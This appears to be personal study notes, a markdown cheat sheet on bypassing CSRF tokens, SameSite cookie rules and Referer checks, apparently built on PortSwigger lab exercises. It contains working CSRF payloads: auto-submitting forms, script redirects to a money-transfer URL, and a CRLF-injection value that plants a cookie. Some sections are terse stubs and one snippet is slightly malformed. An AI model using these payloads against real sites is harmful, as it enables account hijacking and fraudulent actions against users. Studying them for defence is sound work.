# Content
- [Bypassing CSRF token validation](#bypassing-csrf-token-validation)
  - [Validation of CSRF token depends on request method](#validation-of-csrf-token-depends-on-request-method)
  - [Validation of CSRF token depends on token being present](#validation-of-csrf-token-depends-on-token-being-present)
  - [CSRF token is not tied to the user session](#csrf-token-is-not-tied-to-the-user-session)
  - [CSRF token is tied to a non-session cookie](#csrf-token-is-tied-to-a-non-session-cookie)
  - [CSRF token is tied to a length](#csrf-token-is-tied-to-a-length)
  - [CSRF token is simply duplicated in a cookie](#csrf-token-is-simply-duplicated-in-a-cookie)
- [Bypassing SameSite cookie restrictions](#bypassing-samesite-cookie-restrictions)
  - [How SameSite Works](#how-samesite-works)
  - [Bypassing SameSite Lax restrictions using GET requests](#bypassing-samesite-lax-restrictions-using-get-requests)
  - [Bypassing SameSite Lax restrictions with newly issued cookies](#bypassing-samesite-lax-restrictions-with-newly-issued-cookies)
  - [Bypassing SameSite restrictions using on-site gadgets (Strict , Lax )](#bypassing-samesite-restrictions-using-on-site-gadgets-strict--lax-)
  - [Bypassing SameSite restrictions via vulnerable sibling domains](#bypassing-samesite-restrictions-via-vulnerable-sibling-domains)
- [Bypassing Referer-based CSRF defenses](#bypassing-referer-based-csrf-defenses)
  - [Validation of Referer depends on header being present](#validation-of-referer-depends-on-header-being-present)
  - [Validation of Referer can be circumvented](#validation-of-referer-can-be-circumvented) 


# Bypassing CSRF token validation
## Validation of CSRF token depends on request method

try diffrent methods

## Validation of CSRF token depends on token being present

remove paramter

## CSRF token is not tied to the user session

obtain a token and use it

## CSRF token is tied to a non-session cookie
- If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. 
- The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 
- The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged

EX:
```
POST /email/change HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 68  
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv  
  
csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

## CSRF token is tied to a length
- change a char

use crlf injection EX :

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```


## CSRF token is simply duplicated in a cookie

- some applications do not maintain any server-side record of tokens that have been issued

- the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie-but

- instead duplicate each token within a cookie and a request parameter.

EX:
```
POST /email/change HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 68  
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa  
  
csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```



# Bypassing SameSite cookie restrictions
![site-vs-origin](https://github.com/user-attachments/assets/2819883f-6cc4-4c1a-8205-293578211b82)

| Request from            | Request to                  | Same-site?                          | Same-origin?                      |
|--------------------------|-----------------------------|--------------------------------------|-----------------------------------|
| `https://example.com`    | `https://example.com`       | Yes                                  | Yes                               |
| `https://app.example.com`| `https://intranet.example.com` | Yes                                  | No: mismatched domain name       |
| `https://example.com`    | `https://example.com:8080`  | Yes                                  | No: mismatched port              |
| `https://example.com`    | `https://example.co.uk`     | No: mismatched eTLD                 | No: mismatched domain name       |
| `https://example.com`    | `http://example.com`        | No: mismatched scheme               | No: mismatched scheme            |


## How SameSite Works
The SameSite mechanism limits which cookies are sent with cross-site requests, reducing the risk of Cross-Site Request Forgery (CSRF) attacks. Before SameSite, cookies were included in all requests to their issuing domain, even if triggered by unrelated third-party websites.
SameSite Restriction Levels

### Strict:
- Cookies are not sent in any cross-site requests.
- Recommended for sensitive actions, such as authenticated user sessions.
- Provides strong security but may disrupt user experience when cross-site functionality is needed.

### Lax:
- Cookies are sent in cross-site requests only when:
- The request uses the GET method.
- It is triggered by top-level navigation, such as clicking a link.
- Prevents inclusion in POST requests and background requests like scripts or iframes.

### None:
- Cookies are sent with all cross-site requests, with no restrictions.
- Requires the Secure attribute, ensuring cookies are sent only over HTTPS.
- Useful for third-party cookies (e.g., tracking cookies) but poses security risks.


## Bypassing SameSite Lax restrictions using GET requests
### craft get link
```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```
### method override
for example Symfony supports the _method parameter 
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
## Bypassing SameSite Lax restrictions with newly issued cookies
- Newly issued cookies (without explicit SameSite restrictions) bypass Lax enforcement for top-level POST requests during the first 120 seconds. This ensures compatibility with SSO mechanisms but introduces a temporary vulnerability to cross-site attacks.
- attackers can exploit functionalities like OAuth login flows that issue new session cookies to refresh the victimâ€™s session cookie. Steps include:
  - Triggering a cookie refresh using top-level navigation.
  - Redirecting the victim back to the attacker's site to execute a CSRF attack.

 
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```


## Bypassing SameSite restrictions using on-site gadgets (Strict , Lax )
find a gadget that results in a secondary request within the same site

EX : DOM-based open redirection.
```html
<script>  
document.location =```https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?  
postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1```;  
</script>
```


## Bypassing SameSite restrictions via vulnerable sibling domains
- XSS
- Cross-site WebSocket hijacking


# Bypassing Referer-based CSRF defenses

## Validation of Referer depends on header being present
HTML page that hosts the CSRF attack contain:  
```html
<meta name="referrer" content="never">
```

## Validation of Referer can be circumvented
Some applications validate the Referer header in a naive way that can be bypassed


> **Note:** This ensures that the full URL will be sent, including the query string `Referrer-Policy: unsafe-url`
